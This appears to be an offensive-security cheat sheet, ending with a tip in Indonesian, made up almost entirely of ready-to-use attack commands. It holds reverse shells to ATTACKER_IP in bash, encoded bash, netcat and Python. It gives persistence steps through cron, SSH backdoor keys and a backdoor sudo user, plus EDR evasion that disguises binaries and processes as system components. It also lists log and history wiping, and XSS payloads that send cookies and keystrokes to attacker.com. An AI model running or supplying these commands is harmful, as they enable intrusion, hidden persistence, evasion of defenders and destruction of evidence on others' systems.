# 📋 Common Commands Cheat Sheet

## 🔍 Reconnaissance Commands

### Subdomain Enumeration
```bash
# Subfinder
subfinder -d target.com -silent

# Amass
amass enum -passive -d target.com

# Certificate Transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### Port Scanning
```bash
# Nmap quick scan
nmap -F target.com

# Nmap service detection
nmap -sV -sC target.com

# Masscan fast scan
masscan -p1-65535 target.com --rate=1000
```

### Web Enumeration
```bash
# Directory discovery
dirsearch -u https://target.com -e php,html,js

# Technology detection
whatweb target.com

# HTTP probe
httpx -l targets.txt -title -status-code
```

## 🔄 Reverse Shell Commands

### Bash Reverse Shells
```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Base64 encoded
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDAmMQ==" | base64 -d | bash

# Netcat reverse shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python Reverse Shells
```python
# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3 version
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Gsocket Commands
```bash
# Server (listener)
gs-netcat -l -s "secret_key"

# Client (connect)
gs-netcat -c -s "secret_key" -i

# Background connection
nohup gs-netcat -c -s "secret_key" -i &
```

## 🔒 Persistence Commands

### Cron Jobs
```bash
# Every 5 minutes
echo "*/5 * * * * /usr/bin/reverse_shell.sh" | crontab -

# Daily at 3 AM
echo "0 3 * * * /usr/local/bin/maintenance.sh" | crontab -

# List cron jobs
crontab -l
```

### SSH Keys
```bash
# Generate SSH key
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key -N ""

# Add public key
echo "ssh-rsa AAAAB3NzaC1yc2E... user@host" >> ~/.ssh/authorized_keys

# Set permissions
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

### User Creation
```bash
# Create user
useradd -m -s /bin/bash backdoor_user

# Set password
echo "backdoor_user:SecretPass123" | chpasswd

# Add to sudo
usermod -aG sudo backdoor_user
```

## 🌐 JavaScript Enumeration

### Find JS Files
```bash
# GAU
gau target.com | grep ".js" | tee js_files.txt

# Wayback URLs
waybackurls target.com | grep ".js" | tee js_wayback.txt

# Katana crawler
katana -u https://target.com -jc -silent | tee js_katana.txt
```

### Extract Secrets
```bash
# API keys
grep -E -o "(apiKey|authToken|client_secret|accessToken)[\"'= ]+[^\"' ]+" js_files.txt

# AWS keys
grep -E -o "AKIA[0-9A-Z]{16}" js_files.txt

# Google API keys
grep -E -o "AIza[0-9A-Za-z\\-_]{35}" js_files.txt
```

## 🛡️ EDR Bypass Commands

### Binary Obfuscation
```bash
# Rename binary
mv gs-netcat /usr/bin/ld-linux-x86-64.so.2

# Strip symbols
strip gs-netcat

# Add padding
dd if=/dev/zero bs=1 count=1000 >> gs-netcat

# UPX packing
upx --ultra-brute gs-netcat
```

### Process Hiding
```bash
# Change process name
exec -a "systemd-worker" gs-netcat -c -s secret -i

# Background with custom name
nohup bash -c 'exec -a "kworker" gs-netcat -c -s secret -i' &
```

## 🧹 Log Cleaning Commands

### Clear History
```bash
# Bash history
history -c
history -w
echo "" > ~/.bash_history

# Disable history
unset HISTFILE
export HISTSIZE=0
```

### Clear System Logs
```bash
# Auth logs
> /var/log/auth.log
> /var/log/secure

# Web server logs
> /var/log/apache2/access.log
> /var/log/nginx/access.log

# System logs
> /var/log/syslog
> /var/log/messages
```

## 🔓 Common Exploits

### SQL Injection
```sql
-- Basic SQLi
' OR '1'='1

-- Union select
' UNION SELECT 1,2,3--

-- Time-based blind
'; WAITFOR DELAY '00:00:05'--
```

### XSS Payloads
```javascript
// Basic XSS
<script>alert('XSS')</script>

// Cookie stealing
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('http://attacker.com/log.php?key='+String.fromCharCode(e.which))}</script>
```

### File Upload Bypass
```bash
# Double extension
shell.php.jpg

# Null byte
shell.php%00.jpg

# MIME type spoofing
Content-Type: image/jpeg
```

## 🔧 Useful One-Liners

### Network
```bash
# Check connectivity
ping -c 1 8.8.8.8

# Port check
nc -zv target.com 80

# HTTP request
curl -I https://target.com
```

### System Information
```bash
# OS info
uname -a

# User info
id

# Network interfaces
ip addr show

# Running processes
ps aux
```

### File Operations
```bash
# Find SUID files
find / -perm -4000 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null

# Search for passwords
grep -r "password" /etc/ 2>/dev/null
```

## 📱 Mobile & Specific Platforms

### Android
```bash
# ADB commands
adb devices
adb shell
adb install app.apk
```

### Windows
```cmd
# System info
systeminfo

# Network info
ipconfig /all

# Users
net user

# Services
sc query
```

## 🎯 Quick Automation

### Bash Functions
```bash
# Quick recon
recon() {
    subfinder -d $1 -silent | httpx -silent | tee live_hosts.txt
}

# Port scan
portscan() {
    nmap -F $1 | tee nmap_$1.txt
}

# JS enum
jsenum() {
    gau $1 | grep ".js" | tee js_$1.txt
}
```

---

**💡 Tip**: Simpan cheat sheet ini dan customize sesuai kebutuhan Anda!
